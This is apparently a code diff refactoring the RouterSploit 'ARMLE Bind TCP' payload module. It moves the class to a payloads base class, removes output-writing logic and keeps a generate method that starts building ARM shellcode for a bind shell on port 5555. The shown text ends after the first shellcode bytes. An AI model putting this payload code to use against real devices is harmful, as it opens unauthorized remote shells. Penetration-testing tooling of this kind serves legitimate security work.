@@ -1,15 +1,10 @@
 from routersploit import (
     exploits,
-    armle,
-    validators,
-    random_text,
-    print_success,
-    print_status,
-    print_error,
-    print_info
+    payloads,
+    validators
 )
 
-class Exploit(exploits.Exploit, armle.Armle):
+class Exploit(payloads.Payload):
     __info__ = {
         'name': 'ARMLE Bind TCP',
         'authors': [
@@ -19,35 +14,11 @@ class Exploit(exploits.Exploit, armle.Armle):
         ],
     }
 
-    port = exploits.Option(5555, 'Bind port', validators=validators.integer)
+    architecture = "armle"
+    port = exploits.Option(5555, 'Bind Port', validators=validators.integer)
 
-    output = exploits.Option('python', 'Output type: elf/python')
-    filepath = exploits.Option('', 'Output file to write')
-
-    def __init__(self):
-        self.filepath = "/tmp/{}".format(random_text(8))
-
-    def run(self):
-        print_status("Generating ARMLE Bind TCP payload")
-        print_status("Bind Port: {}".format(self.port))
-
-        self.generate(self.port)
-
-        if self.output == "elf":
-            with open(self.filepath, 'w+') as f:
-                print_status("Building ELF payload")
-                content = self.generate_elf()
-
-                print_success("Saving file {}".format(self.filepath))
-                f.write(content)
-
-        elif self.output == "python":
-            print_success("Building payload for python")
-            content = self.generate_python()
-            print_info(content)
-
-    def generate(self, bind_port):
-        bind_port = self.convert_port(bind_port)
+    def generate(self, port):
+        bind_port = self.convert_port(port)
 
         self.payload = (
             "\x02\x00\xa0\xe3" +
